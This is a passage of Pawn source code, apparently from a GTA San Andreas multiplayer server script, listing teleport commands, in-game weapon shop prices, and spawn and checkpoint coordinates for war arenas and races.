	{2007.7452,1023.2051,994.4688,2010.1840,1026.2886,996.5933,132.2588,10,0},
	{1981.3463,1002.8295,994.4688,1977.2777,1002.2075,994.4688,267.0822,10,0},
	{1965.6771,990.7311,992.4688,1963.8007,991.7985,992.4688,235.4915,10,0}
};
new Pictures2[][PicturesEnum] =
{
	// camera x, camera y, camera z, x, y, z, a, interior, time
	{-2800.625244,1187.076904,20.273437,-2803.139160,1182.754882,20.273437,319.8770,0,22},
	{-2492.868652,-281.428619,41.514415,-2485.1018,-284.8436,41.5391,/*-278*/139.7674,0,12},
	{-2492.868652,-281.428619,41.514415,-2479.1646,-284.6827,41.5519,106.2640,0,12},
	{-1999.710693,-859.676757,33.171875,-2004.706787,-859.480468,32.071875,269.8022,0,12},
	{-1182.502441,-2634.026367,12.757812,-1180.495849,-2638.605957,11.257812,/*-193*/95.9982,0,12},
	{1979.708000,948.242900,59.561400,1985.276700,947.952600,55.811900,83.1006,0,23},
	{1411.035156,-219.597702,7.902362,1407.304687,-222.926864,7.902362,344.8089,0,11}
};
new Teleports[][TeleportsEnum] =
{
	// command, x, y, z, a, interior, world, level, author, withv, freeze, no shooting
	{"/LV",2031.0074,1338.4502,10.8203,267.9351,0,world_normal,1,"",true,false,false},
	{"/SF",-2663.4424,372.8385,4.3246,2.1954,0,world_normal,1,"",true,false,false},
	{"/LS",1478.7906,-1739.5715,13.5469,351.7540,0,world_normal,1,"",true,false,false},
	{"/LC",-782.2662,506.2931,1371.7422,87.9988,1,world_normal,1,"",false,false,false},
	{"/Race",2057.3232,843.6667,6.7031,358.6158,0,world_normal,1,"",true,false,false},
	{"/AP",1667.1559,1594.8059,10.8203,106.3800,0,world_normal,1,"",true,false,false},
	{"/Ships",2327.2700,558.9611,7.7813,359.4181,0,world_normal,1,"",true,false,false},
	{"/Docks",-1655.0560,1299.1433,7.0391,42.8739,0,world_normal,1,"BroLeX",true,false,false},
	{"/Sandkings",827.5804,849.8192,11.7531,202.9390,0,world_normal,1,"SiLVeR",true,false,false},
	{"/Drifts",2338.5198,1406.6997,43.0005,42.9568,0,world_normal,1,"",true,false,false},
	{"/CTest",1393.1804,769.6811,10.8203,202.9390,0,world_normal,2,"SiLVeR",false,false,false},
	{"/AS",384.4973,2542.0071,16.6883,177.7487,0,world_normal,2,"",true,false,false},
	{"/CT",-2323.7439,-1627.4508,483.7045,228.2475,0,world_normal,2,"",true,false,false},
	{"/CB",-2401.7783,-2207.9673,33.2891,288.9551,0,world_normal,2,"Yuval",true,false,false},
	{"/Bumper",1364.1497,2142.5449,11.0156,168.2139,0,world_normal,2,"",true,false,false},
	{"/Jump",-673.4125,2323.9785,134.9898,83.5746,0,world_normal,2,"",true,false,false},
	{"/TSF",-1976.3447,200.3035,27.6803,89.1961,0,world_normal,2,"",true,false,false},
	{"/Tower",1544.3878,-1352.7461,329.4753,95.7563,0,world_normal,3,"",true,false,false},
	{"/Water",183.5687,-1940.4738,-4.3239,359.1816,0,world_normal,3,"",true,false,false},
	{"/Water 2",2478.4783,450.5728,-59.9307,1.6385,0,world_normal,3,"",true,false,false},
	{"/SFB",-1828.0659,577.0693,234.8906,97.5607,0,world_normal,3,"",false,false,true},
	{"/Diving",-2883.1025,2568.2339,264.4305,88.3103,0,world_normal,3,"",false,false,true},
	{"/War",-1421.6965,1257.4225,1039.8672,243.5434,16,world_normal,4,"",false,false,false},
	{"/Quarry",671.7627,886.9266,-40.3067,102.7677,0,world_normal,4,"",true,false,false},
	{"/FirePlace",-653.1002,2348.2078,158.1101,18.7996,0,world_normal,4,"",true,false,false},
	{"/Garage",-1910.1072,227.1859,35.0002,90.8891,0,world_normal,5,"",true,false,false},
	{"/Garage 2",2651.4255,-2003.5831,13.3828,92.6507,0,world_normal,5,"",true,false,false},
	{"/Bank",-32.2787,-55.6368,1003.5469,272.3936,6,world_normal,5,"",false,false,false},
	{"/Ammu",2123.8337,952.7582,10.8130,269.2235,0,world_normal,5,"",true,false,false},
	{"/Cannon",-512.3422,2556.7632,53.4141,36.7830,0,world_normal,6,"",true,false,true},
	{"/Bar",507.2686,-73.7914,998.7578,75.3875,11,world_normal,6,"",false,false,false},
	{"/Ramp",1863.5116,-1383.2952,13.4834,269.6548,0,world_normal,1,"",true,false,true},
	{"/Stunts",-1475.8801,1561.7330,1052.5313,271.9292,14,world_normal,1,"",true,false,true},
	{"/Fun",-1353.9729,-512.2011,14.1719,247.1510,0,world_normal,1,"Fyro",true,false,true},
	{"/APRace",1415.6378,-2497.6167,13.5547,274.4730,0,world_normal,1,"BroLeX",true,false,true},
	{"/Challenge",1089.9576,1725.9329,10.8203,94.8821,0,world_normal,1,"SouLeSs",false,false,true},
	{"/LWU",-810.6521,463.3463,36.0170,188.5364,0,world_normal,1,"Yosi",false,true,true},
	{"/BigRampa",841.1010,-3577.1174,793.5667,359.1314,0,world_normal,1,"Yosi",true,true,true},
	{"/Maze",-67.1489,-3230.8315,34.8597,350.4661,0,world_normal,1,"Yosi",false,true,true},
	{"/TheVert",520.1968,-3215.4851,6.2494,180.4884,0,world_normal,1,"FrighT",true,true,true},
	{"/BChallenge",1242.8450,-1922.9786,31.4538,97.9392,0,world_normal,1,"Yuval",true,true,true},
	{"/Slide",433.1866,-2657.3557,328.5041,270.5224,0,world_normal,1,"FrighT",true,true,true},
	{"/Christmas",1069.7091,1058.5553,10.2755,314.2160,0,world_normal,1,"SaMaRa",false,true,false},
	{"/Atlantis",2941.7224,-1673.2147,-63.0260,276.3872,0,world_normal,1,"SaMaRa",true,true,false},
	{"/DriftCity",1533.0221,-3941.8726,33.7373,280.3979,0,world_normal,1,"SaMaRa",true,true,true},
	{"/WStunts",1700.1450,-2436.9578,13.5547,176.6333,0,world_wstunts,1,"SaMaRa",true,true,true},
	{"/BigJump",1403.8591,-1202.5792,187.1762,179.8420,0,world_normal,1,"BroLeX",true,false,true},
	{"/Bicycle",72.5504,439.5824,1246.5039,92.9250,0,world_normal,1,"Rewind",true,true,true},
	{"/Jumping",3846.3796,-1522.9557,704.3564,229.5353,0,world_normal,1,"StreeTBoy+Zryex",true,true,true},
	{"/Jeeps",248.5417,1418.0601,10.5447,270.2980,0,world_normal,1,"StreeTBoy+Zryex",true,true,true},
	{"/Cars",-2923.8413,423.9530,4.4863,359.8718,0,world_normal,1,"StreeTBoy+Zryex",true,true,true},
	{"/Maze 2",-4705.8418,1627.6956,80.4331,358.0043,0,world_normal,1,"StreeTBoy+Zryex",false,true,true},
	{"/SBike",-2625.7266,1453.6296,6.912,339.4415,0,world_normal,1,"StreeTBoy+Zryex",true,true,true}
};
new Ammunation[][AmmunationEnum] =
{
	// name, id, cost, ammo, level, slot
	{"Pistol",22,1000,100,1,0},
	{"SilencedPistol",23,1200,75,1,0},
	{"DesertEagle",24,1500,100,1,0},
	{"Shotgun",25,1500,100,1,1},
	{"CombatShotgun",27,2500,100,2,1},
	{"SawnoffShotgun",26,3000,50,1,1},
	{"MicroUzi",28,2600,100,1,2},
	{"Tec9",32,2400,100,1,2},
	{"MP5",29,2500,100,2,2},
	{"AK47",30,3500,100,3,3},
	{"M4",31,4000,100,4,3},
	{"CountryRifle",33,3200,10,4,4},
	{"SniperRifle",34,4500,10,5,4},
	{"Grenade",16,6000,5,8,5},
	{"Molotov",18,6000,5,8,5},
	{"Satchel Charge",39,7500,2,9,5},
	{"Tear Gas",17,600,2,9,5},
	{"RocketLauncher",35,8000,1,10,6},
	{"HSRocketLauncher",36,8000,1,11,6},
	{"Spray",41,200,500,6,7},
	{"FireExtinguisher",42,450,500,6,7},
	{"BrassKnuckles",1,10000,0,1,8},
	{"Knife",4,50000,0,6,9},
	{"Bat",5,45000,0,6,9},
	{"Katana",8,60000,0,6,9},
	{"Chainsaw",9,75000,0,7,9}
};
new Float:WarPositions[][4] =
{
	// x, y, z, a
	{-1430.9329,1259.6521,1039.8672,254.7156},
	{-1431.8860,1253.7933,1039.8672,260.4601},
	{-1432.5056,1247.8628,1039.8672,266.7268},
	{-1432.0901,1241.8976,1039.8672,274.0380},
	{-1430.9341,1236.6349,1039.8672,285.5270},
	{-1428.5359,1230.3431,1039.8672,293.3604},
	{-1425.1649,1225.5625,1039.8672,303.8049},
	{-1420.9004,1220.4844,1039.8741,318.4273},
	{-1415.3600,1215.9824,1039.8672,328.3496},
	{-1409.3510,1213.2399,1039.8672,339.8386},
	{-1402.9584,1211.7975,1039.8672,351.3276},
	{-1395.6345,1211.2839,1039.8672,4.3833},
	{-1389.3068,1213.2089,1039.8672,20.0502},
	{-1383.3143,1215.4729,1039.8672,25.2724},
	{-1378.1449,1218.4443,1039.8672,31.5392},
	{-1373.4987,1222.0001,1039.8672,44.0726},
	{-1369.5491,1227.6154,1039.8672,60.2617},
	{-1366.5486,1234.3701,1039.8672,73.3173},
	{-1365.5688,1241.4601,1039.8741,86.3730},
	{-1365.7275,1249.2192,1039.8672,102.5620},
	{-1367.6246,1256.1986,1039.8672,116.1399},
	{-1370.7230,1262.5270,1039.8672,123.4511},
	{-1375.2396,1268.4470,1039.8741,139.6402},
	{-1381.0576,1275.0394,1039.8672,153.2181},
	{-1387.8148,1278.0211,1039.8672,162.6182}
};
new Float:WarPositions2[][4] =
{
	// x, y, z, a
	{-678.0554,2385.0735,161.7888,252.4624},
	{-679.2056,2379.0408,161.3293,262.3417},
	{-681.9447,2370.3550,160.6970,263.6246},
	{-681.3465,2357.6316,159.7597,303.6382},
	{-674.8608,2347.0332,158.9923,291.0311},
	{-662.8807,2338.2366,158.0681,11.1516},
	{-652.5119,2340.4595,157.7182,347.5151},
	{-638.9437,2342.9299,157.2955,50.7770},
	{-634.0448,2352.3706,157.8781,78.0901},
	{-632.0037,2360.8608,158.4818,76.0847},
	{-630.7858,2374.5967,159.2675,76.0847},
	{-630.8820,2384.2251,159.6320,79.6678},
	{-635.3759,2393.1304,159.7947,136.5795},
	{-647.1854,2404.2524,159.4097,168.4243},
	{-655.4656,2401.2793,160.1532,201.7535},
	{-663.7195,2397.0750,160.8627,201.0850},
	{-672.5058,2390.9634,161.4762,245.7778}
};
new Float:WarPositions3[][4] =
{
	// x, y, z, a
	{-1299.7264,2546.5657,87.7422,274.1018},
	{-1303.9529,2555.9031,87.0958,2.0436},
	{-1307.3884,2553.4380,87.4290,83.2395},
	{-1319.5493,2539.9519,87.5587,6.9747},
	{-1314.6217,2541.5100,87.7422,289.0962},
	{-1311.6113,2528.7515,87.6399,32.1510},
	{-1310.1027,2522.9004,87.4097,212.1510},
	{-1315.6029,2508.7024,87.0420,34.4021},
	{-1309.2416,2492.9487,89.8672,181.8151},
	{-1316.5099,2503.3513,89.5703,337.7607},
	{-1321.2992,2503.0444,89.5703,157.7608},
	{-1320.9303,2508.5989,92.5406,195.6216},
	{-1321.3324,2514.3613,92.5406,15.6216},
	{-1325.7001,2526.6069,89.9844,15.6216},
	{-1337.9225,2522.8469,87.0469,127.7751}
};
new Float:RacePositions_cars1[][4] = // cars
{
	// x, y, z, a
	{2034.1392,830.2907,6.4615,89.6834}, // spawn
	{2034.0387,833.6286,6.4635,88.6063}, // spawn
	{2034.4441,836.8354,6.4615,90.3770}, // spawn
	{2034.2662,849.2298,6.4627,89.7075}, // spawn
	{2033.0305,852.8696,6.4576,88.7578}, // spawn
	{2033.1520,856.5483,6.4576,87.2883}, // spawn
	{2033.8063,825.2623,6.5590,89.9874}, // spawn
	{2033.4233,860.6456,6.4773,86.4906}, // spawn
	{1923.8533,844.2096,6.9046},
	{1787.5899,842.8079,10.1933},
	{1617.0345,843.0211,6.2665},
	{1351.9598,854.6159,6.3318},
	{1217.7894,1059.9136,7.0608},
	{1216.8425,1271.4267,6.2696},
	{1216.9014,1453.4639,6.2676},
	{1218.2521,1868.6396,6.2689},
	{1225.7788,2311.7390,7.4776},
	{1588.2908,2463.1513,6.3043},
	{1943.9221,2533.5292,6.3302},
	{2102.9279,2578.9143,6.6487},
	{2361.1352,2622.7954,6.8118},
	{2667.3054,2465.0954,6.1514},
	{2718.6228,2225.1738,6.3551},
	{2718.8491,1994.2868,6.5593},
	{2718.8071,1762.5017,6.2021},
	{2716.6882,1521.0556,6.2333},
	{2715.9638,1268.4537,6.2853},
	{2680.7507,990.0670,6.2959},
	{2517.8837,855.7534,6.2738},
	{2312.1938,844.2174,6.2731},
	{2092.9567,844.1456,6.5358}
};
new Float:RacePositions_cars2[][4] = // cars
{
	// x, y, z, a
	{-2584.4524,1136.5493,55.1676,67.2254}, // spawn
	{-2586.9041,1132.9315,55.1342,69.1687}, // spawn
	{-2587.5183,1128.8094,55.1356,65.6073}, // spawn
	{-2591.9021,1121.1204,55.2454,60.6461}, // spawn
	{-2592.9814,1118.1661,55.1982,65.9801}, // spawn
	{-2594.6150,1114.0425,55.1498,61.8211}, // spawn
	{-2583.1663,1139.7406,55.2856,67.4080}, // spawn
	{-2596.6707,1109.9078,55.2851,62.0738}, // spawn
	{-2639.1587,1159.3495,55.3301,43.3582},
	{-2669.1201,1210.5046,55.2087,26.1030},
	{-2679.5205,1272.5015,55.1114,0.7191},
	{-2680.6394,1388.1908,55.3430,3.3551},
	{-2681.5398,1474.2192,56.3287,358.7712},
	{-2681.4817,1539.5972,61.0761,359.8974},
	{-2681.9438,1637.8274,65.8960,358.8387},
	{-2681.7361,1721.8123,67.9313,358.2742},
	{-2682.1350,1851.1465,67.0322,1.7644},
	{-2681.7507,1984.6643,61.3707,3.1513},
	{-2681.6045,2046.6636,56.9921,3.2766},
	{-2681.3440,2110.0938,55.5186,3.2840},
	{-2682.6841,2166.2644,55.4618,3.8181},
	{-2748.3574,2351.1580,72.5355,25.8388}
};
new Float:RacePositions_cars3[][4] = // cars
{
	// x, y, z, a
	{2842.0168,-1877.9281,10.6431,356.5420}, // spawn
	{2839.3115,-1877.8511,10.6423,356.5403}, // spawn
	{2834.5776,-1877.5229,10.6413,357.1818}, // spawn
	{2826.7795,-1876.9994,10.6408,358.7245}, // spawn
	{2823.9724,-1877.2190,10.6430,358.8948}, // spawn
	{2820.4607,-1877.8885,10.7181,0.9318}, // spawn
	{2816.1331,-1877.0511,10.8981,1.0284}, // spawn
	{2846.0129,-1876.9452,10.8124,356.3705}, // spawn
	{2833.5576,-1821.0168,10.7533,22.8796},
	{2844.2434,-1752.7676,10.7528,340.3439},
	{2868.3696,-1657.1077,10.5811,4.3261},
	{2904.9468,-1524.3451,10.7533,340.3411},
	{2914.7095,-1429.0492,10.5809,348.2052},
	{2898.3542,-1287.5836,10.5887,15.0502},
	{2878.9973,-1147.4465,10.5866,10.4132},
	{2879.3276,-1034.7944,10.5812,357.8506},
	{2881.8054,-950.3818,10.5812,357.8641},
	{2884.7402,-869.8936,10.5818,355.3688},
	{2885.2478,-775.9728,10.5524,356.9313},
	{2886.7727,-662.9958,10.5422,358.3524},
	{2868.1404,-531.9221,13.8234,14.2363},
	{2822.7131,-462.8184,19.2968,39.0626},
	{2761.0085,-395.8730,23.5893,44.4345},
	{2704.5977,-312.1010,27.9422,27.6449},
	{2742.7422,-170.6710,31.3763,338.4538},
	{2763.5537,-53.3500,35.0344,2.6338},
	{2764.4888,174.5610,20.9146,52.4352}
};
new Float:RacePositions_bikes1[][4] = // bikes
{
	// x, y, z, a
	{1014.9877,2464.8433,10.3944,176.3229}, // spawn
	{1012.4284,2465.0081,10.3944,176.3229}, // spawn
	{1008.7739,2465.2432,10.3944,176.3229}, // spawn
	{1007.9451,2465.2966,10.3944,176.3229}, // spawn
	{1006.7997,2465.3704,10.3944,176.3229}, // spawn
	{1005.2894,2465.4675,10.3944,176.3229}, // spawn
	{1004.3630,2465.5271,10.3944,176.3229}, // spawn
	{1002.8526,2465.6243,10.3944,176.3229}, // spawn
	{1007.3441,2438.0874,10.2380},
	{1007.9318,2407.5273,10.2131},
	{1006.7258,2362.9731,10.2385},
	{1006.8522,2312.6665,10.2376},
	{1007.9586,2200.6584,10.2644},
	{1007.2860,2110.4651,10.2384},
	{1006.9960,1993.5107,10.2379},
	{1007.5819,1880.2899,10.2404},
	{1007.1385,1776.9647,10.3248},
	{1007.3524,1690.5826,10.3399},
	{1006.5212,1587.9988,10.2339},
	{1006.8818,1482.9268,10.2383},
	{1008.5153,1372.3396,10.4586},
	{1007.8040,1279.6367,10.2383},
	{1061.9104,1192.7136,10.2381},
	{1106.3502,1193.1711,10.2382},
	{1170.4794,1193.3756,11.1675},
	{1243.8046,1193.4349,12.6052},
	{1331.6099,1193.5825,10.2383},
	{1488.8981,1133.1171,10.2386},
	{1638.5278,1131.6663,10.2450},
	{1743.5010,1132.9730,10.5953},
	{1867.5187,1127.7606,10.2303},
	{1964.2139,1093.0493,10.2382},
	{2049.1013,1069.9949,10.2386}
};
new Float:RacePositions_bikes2[][4] = // bikes
{
	// x, y, z, a
	{-434.0139,-1918.4247,6.0343,170.7613},
	{-436.4400,-1918.8882,6.0499,172.5693},
	{-439.6632,-1919.3778,6.1135,174.4577},
	{-442.3465,-1921.2880,6.3864,172.7469},
	{-444.7543,-1922.0009,6.5399,178.0020},
	{-446.9541,-1921.2524,6.5629,177.2277},
	{-450.0292,-1922.2046,6.8062,173.7386},
	{-452.3906,-1923.7516,7.3947,185.7784},
	{-448.6249,-1964.2284,20.3561},
	{-458.1657,-2008.3461,41.1829},
	{-503.4051,-2027.6466,50.1217},
	{-593.0251,-2030.6472,43.0582},
	{-660.8182,-2052.0396,25.3908},
	{-719.7545,-2122.7678,25.5537},
	{-791.7249,-2150.9534,22.9276},
	{-858.4805,-2180.6152,25.4928},
	{-930.2927,-2177.7502,33.3663},
	{-958.1819,-2226.6611,40.9744},
	{-958.5535,-2280.7146,52.5052},
	{-944.6902,-2349.4446,59.2080},
	{-990.7551,-2369.2119,65.0349},
	{-1089.1414,-2373.4397,41.7375},
	{-1162.9523,-2365.2229,21.7807},
	{-1248.4536,-2295.7910,19.8806},
	{-1282.6423,-2228.0342,22.2004},
	{-1365.1041,-2170.3508,21.1429},
	{-1441.5775,-2161.0530,8.3762},
	{-1575.0280,-2153.7158,13.4207},
	{-1669.5939,-2207.0701,33.7174},
	{-1680.3260,-2284.0601,39.9020},
	{-1748.8374,-2307.3528,44.3076},
	{-1839.5695,-2358.0354,31.2086},
	{-1915.9904,-2434.9878,30.1369},
	{-2019.6864,-2513.2915,32.2609}
};
new Float:RacePositions_bikes3[][4] = // bikes
{
	// x, y, z, a
	{139.8730,-136.9935,0.9824,267.4115}, // Spawn
	{139.5813,-139.1289,0.9900,270.0447}, // Spawn
	{140.1381,-140.6494,0.9794,267.8939}, // Spawn
	{140.0008,-142.7638,0.9982,268.5327}, // Spawn
	{140.2519,-144.8962,0.9856,273.3771}, // Spawn
	{135.0244,-147.1710,1.0014,267.6229}, // Spawn
	{135.3775,-143.8555,0.9891,266.8286}, // Spawn
	{135.5983,-141.3580,0.9867,268.1125}, // Spawn
	{135.7156,-139.1137,1.0050,269.3876}, // Spawn
	{172.9747,-142.3361,0.9951}, // Checkpoint
	{183.7855,-173.0908,0.9951}, // Checkpoint
	{190.3732,-207.6658,0.9973}, // Checkpoint
	{229.2917,-219.1347,0.9767}, // Checkpoint
	{229.5981,-276.8791,0.9948}, // Checkpoint
	{208.7313,-303.5885,0.9990}, // Checkpoint
	{237.5576,-363.9352,7.5123}, // Checkpoint
	{303.1593,-377.3918,8.9234}, // Checkpoint
	{358.3487,-331.9965,12.2655}, // Checkpoint
	{433.3529,-298.2429,6.2572}, // Checkpoint
	{508.7707,-228.9082,13.5199}, // Checkpoint
	{586.4301,-199.3417,12.6526}, // Checkpoint
	{678.7903,-196.4191,14.3239}, // Checkpoint
	{737.5903,-165.3069,18.8874}, // Checkpoint
	{792.7480,-124.4303,22.0322}, // Checkpoint
	{857.9058,-97.4111,26.6431}, // Checkpoint
	{935.0837,-88.6813,17.2189}, // Checkpoint
	{1033.5409,-69.3841,22.3248}, // Checkpoint
	{1146.6981,-67.6708,25.6056}, // Checkpoint
	{1239.3324,-128.2259,38.5151}, // Checkpoint
	{1332.0345,-197.9665,13.2103}, // Checkpoint
	{1461.2823,-208.4109,10.1241}, // Checkpoint
	{1542.6240,-149.2867,16.6027}, // Checkpoint
	{1556.9938,20.3883,23.8205}, // Checkpoint
	{1502.9519,148.6858,31.0739}, // Checkpoint
	{1387.9844,206.1404,18.9685}, // Checkpoint
	{1277.4141,255.1528,18.9751}, // Checkpoint
	{1162.1826,294.7798,18.4831}, // Checkpoint
	{1061.4327,195.8657,32.7357}, // Checkpoint
	{935.3762,184.9057,33.1726}, // Checkpoint
	{798.5553,214.9742,35.7691}, // Checkpoint
	{646.0284,219.4504,23.6446}, // Checkpoint
	{519.8212,144.8567,23.4491} // Checkpoint
};
new Float:RacePositions_planes1[][4] = // planes
{
	// x, y, z, a
	{1352.3718,1829.9078,11.3659,181.8410}, // spawn
	{1374.8915,1830.7054,11.8244,181.8410}, // spawn
	{1394.8060,1831.3456,11.8241,181.8410}, // spawn
	{1422.7988,1832.2454,11.8236,181.8410}, // spawn
	{1442.4453,1832.8770,11.8233,181.8410}, // spawn
	{1473.7260,1833.8821,11.8228,181.8410}, // spawn
	{1501.9083,1834.7880,11.8224,181.8410}, // spawn
	{1529.3849,1835.6709,11.8219,181.8410}, // spawn
	{1472.2067,1751.0537,30.2369},
	{1470.7052,1674.8582,59.4851},
	{1468.7106,1572.6146,89.1771},
	{1466.9655,1482.4878,107.1060},
	{1464.7826,1368.8875,120.4061},
	{1462.0565,1225.9149,108.1817},
	{1459.2290,1079.3514,96.2890},
	{1489.9513,938.8034,91.1571},
	{1615.2198,829.1098,88.5525},
	{1672.5469,670.4016,89.8013},
	{1538.9542,550.9477,85.2059},
	{1358.3312,556.8949,107.1119},
	{1174.8698,638.2738,132.8428},
	{1340.7310,912.7830,70.4448},
	{1411.8538,1176.5391,52.2624},
	{1402.8618,1597.5206,13.6334},
	{1389.4601,1787.0763,11.4722}
};
new Float:RacePositions_planes2[][4] = // planes
{
	// x, y, z, a
	{392.9749,2491.9705,17.4142,91.2932}, // spawn
	{396.3181,2506.4792,17.4515,86.9382}, // spawn
	{370.9828,2508.0315,17.2328,89.9384}, // spawn
	{364.9193,2491.7661,17.4790,91.8855}, // spawn
	{347.8476,2499.5376,17.9514,93.7635}, // spawn
	{343.7871,2518.3069,17.5903,80.9992}, // spawn
	{340.3315,2483.9497,17.4909,97.8518}, // spawn
	{311.1101,2505.6172,17.4680,94.2107}, // spawn
	{259.4920,2511.0398,22.8155,90.5948},
	{131.6469,2490.0454,32.6550,125.6140},
	{-27.1297,2390.3284,32.6352,123.0317},
	{-182.4804,2288.6631,59.4055,123.3363},
	{-279.3150,2226.4080,84.1077,120.7874},
	{-459.1237,2178.6140,61.7320,99.6710},
	{-615.0085,2129.5886,47.7119,108.4128},
	{-766.2026,2123.3237,50.2792,85.7611},
	{-927.2677,2170.4360,55.1823,64.4521},
	{-1104.7382,2169.6831,51.9745,105.2167},
	{-1256.2565,2130.8459,56.2528,102.7936},
	{-1397.9304,2059.3638,78.9648,119.0202},
	{-1483.3429,1928.5798,76.4950,167.9794},
	{-1445.5236,1718.3762,60.7420,203.5989},
	{-1388.7172,1553.8270,47.8069,197.5609},
	{-1337.9559,1326.6144,29.6216,187.7300},
	{-1298.1450,1117.3275,12.5185,196.2602},
	{-1270.0885,967.9536,5.9193,187.1347},
	{-1256.8033,797.9831,46.8547,183.9762},
	{-1250.8538,710.9951,65.6276,183.8743},
	{-1214.4342,520.8325,39.0528,208.6929},
	{-1065.0159,436.4201,31.5719,257.7155},
	{-874.5825,479.3983,14.0256,299.4754},
	{-681.6100,673.6082,5.7809,319.4324},
	{-580.9348,810.6562,23.7504,324.2012},
	{-518.5934,948.3808,55.2308,346.3648},
	{-510.6845,1122.2468,22.7696,359.6068},
	{-517.5222,1333.2347,7.2091,5.1877},
	{-588.9138,1538.9878,8.7535,21.1964},
	{-638.7109,1746.3318,19.0138,3.4120},
	{-607.9970,1954.4329,68.2710,349.1839},
	{-579.9130,2103.2136,86.2436,349.1314},
	{-509.8510,2236.9585,78.2042,296.1269},
	{-274.9677,2236.1277,72.6366,274.1001}
};
new Float:RacePositions_planes3[][4] = // planes
{
	// x, y, z, a
	{0.0,0.0,0.0,0.0}, // spawn
	{0.0,0.0,0.0,0.0}, // spawn
	{0.0,0.0,0.0,0.0}, // spawn
	{0.0,0.0,0.0,0.0}, // spawn
	{0.0,0.0,0.0,0.0}, // spawn
	{0.0,0.0,0.0,0.0}, // spawn
	{0.0,0.0,0.0,0.0}, // spawn
	{0.0,0.0,0.0,0.0}, // spawn
	{0.0,0.0,0.0,0.0},
	{0.0,0.0,0.0,0.0},
	{0.0,0.0,0.0,0.0},
	{0.0,0.0,0.0,0.0},
	{0.0,0.0,0.0,0.0}
};
new Float:RacePositions_boats1[][4] = // boats
{
	// x, y, z, a
	{2266.6868,-253.0076,-0.1554,82.7378}, // spawn
	{2270.2412,-236.0733,-0.0692,80.1493}, // spawn
	{2267.8125,-213.8700,-0.0752,95.8582}, // spawn
	{2253.2930,-188.3017,-0.0951,95.6016}, // spawn
	{2252.4004,-173.9962,-0.0988,103.1049}, // spawn
	{2230.6545,-155.0531,-0.1964,75.4802}, // spawn
	{2156.6885,-170.3593,-0.0909},
	{2090.0735,-147.7252,0.1674},
	{2026.8378,-115.5074,0.2413},
	{1949.8638,-92.1888,0.2468},
	{1782.3601,-33.7725,-0.0663},
	{1733.9009,-26.8244,-0.0891},
	{1648.5410,-13.4290,-0.1700},
	{1604.2379,-71.3360,0.3425},
	{1588.6929,-119.4713,0.3758},
	{1552.5815,-183.4203,0.3625},
	{1479.5757,-237.5359,-0.1210},
	{1431.8827,-255.1073,0.0726},
	{1369.4110,-255.5471,0.3996},
	{1310.1260,-223.8975,-0.1738},
	{1206.6766,-142.9562,-0.1526},
	{1052.5507,-109.3643,0.0833},
	{923.4576,-120.5483,-0.1403},
	{814.1107,-150.0282,-0.1074}
};
new Float:RacePositions_boats2[][4] = // boats
{
	// x, y, z, a
	{2261.7610,-206.8061,-0.5104,101.3037}, // spawn
	{2262.9417,-214.9718,-0.5015,99.0423}, // spawn
	{2263.8459,-221.3767,-0.5066,98.7811}, // spawn
	{2264.7571,-229.6719,-0.4351,94.4059}, // spawn
	{2263.9214,-236.3807,-0.4453,93.7490}, // spawn
	{2264.0684,-245.0404,-0.4430,88.0811}, // spawn
	{2133.3398,-199.4539,-0.4584,80.8050}, // cp 1
	{1817.0126,-45.3835,-0.5072,64.3393}, // cp 2
	{1624.9259,-17.5529,-0.4463,136.2545}, // cp 3
	{1538.8733,-192.3168,-0.4537,131.5951}, // cp 4
	{1338.2251,-243.8371,-0.4465,72.6018}, // cp 5
	{1034.6329,-110.0571,-0.4109,89.9570}, // cp 6
	{833.6332,-137.6589,-0.4387,99.7539}, // cp 8
	{664.7258,-222.1775,-0.4413,90.3427}, // cp 9
	{472.5099,-257.5399,-0.4988,96.8535}, // cp 10
	{291.1995,-360.7945,-0.4546,127.6250}, // cp 11
	{169.2214,-414.5203,-0.3799,73.6624}, // cp 12
	{14.3783,-540.4749,-0.3994,130.0717}, // cp 13
	{-144.8962,-681.7877,-0.5163,139.2572}, // cp 14
	{-241.2721,-609.5110,-0.4712,5.1413}, // cp 15
	{-392.6457,-355.0972,-0.4595,70.6735}, // cp 16
	{-730.5687,-330.0996,-0.2938,86.2057}, // cp 17
	{-1045.5010,-149.7435,-0.4137,11.0348}, // cp 18
	{-994.0894,79.0311,-0.5077,341.9563}, // cp 19
	{-917.7571,260.7104,-0.4323,335.2027}, // cp 20
	{-685.9022,650.7148,-0.2091,328.3188}, // cp 21
	{-490.2446,866.0342,-0.4051,342.9487}, // cp 22
	{-567.1823,1297.9353,-0.3986,4.5346}, // cp 23
	{-629.6838,1644.3525,-0.4470,17.9966}, // cp 24
	{-697.9728,1935.1527,-0.4475,51.6101}, // cp 25
	{-775.3776,1750.5205,-0.4509,169.0683}, // cp 26
	{-883.4055,1659.5070,-0.3532,102.8630} // cp 27
};
new Float:RacePositions_boats3[][4] = // boats
{
	// x, y, z, a
	{0.0,0.0,0.0,0.0}, // spawn
	{0.0,0.0,0.0,0.0}, // spawn
	{0.0,0.0,0.0,0.0}, // spawn
	{0.0,0.0,0.0,0.0}, // spawn
	{0.0,0.0,0.0,0.0}, // spawn
	{0.0,0.0,0.0,0.0}, // spawn
	{0.0,0.0,0.0,0.0}, // spawn
	{0.0,0.0,0.0,0.0}, // spawn
	{0.0,0.0,0.0,0.0},
	{0.0,0.0,0.0,0.0},
	{0.0,0.0,0.0,0.0},
	{0.0,0.0,0.0,0.0},
	{0.0,0.0,0.0,0.0}
};
new Float:WWEPositions[][4] =
{
	{3334.1387,-1158.6171,11.6384,313.4382},
	{3338.2634,-1154.7493,11.6384,128.1114},
	{0.0,0.0,0.0},
	{0.0,0.0,0.0},
	{0.0,0.0,0.0},
	{0.0,0.0,0.0}
};
new Float:DMZ_RandomSpawns_MMnS[][4] =
{
	{2544.5032,2805.8840,19.9922,257.5800},
	{2556.2554,2832.5313,19.9922,1.9000},
	{2561.9175,2848.5532,19.9922,256.6609},
	{2613.9866,2848.4475,19.9922,102.2487},
	{2611.5500,2845.7542,16.7020,87.5428},
	{2545.9243,2839.1824,10.8203,176.2378},
	{2647.6553,2805.0278,10.8203,285.1536},
	{2672.9387,2800.3374,10.8203,60.4288},
	{2672.8306,2792.1057,10.8203,121.8451},
	{2647.7834,2697.5884,19.3222,353.1684},
	{2654.5427,2720.3474,19.3222,303.5359},
	{2653.2063,2738.2432,19.3222,342.1389},
	{2641.1350,2703.2019,25.8222,191.6982},
	{2599.1304,2700.7249,25.8222,76.3487},
	{2606.1384,2721.5237,25.8222,261.2564},
	{2597.3745,2748.0884,23.8222,273.2050},
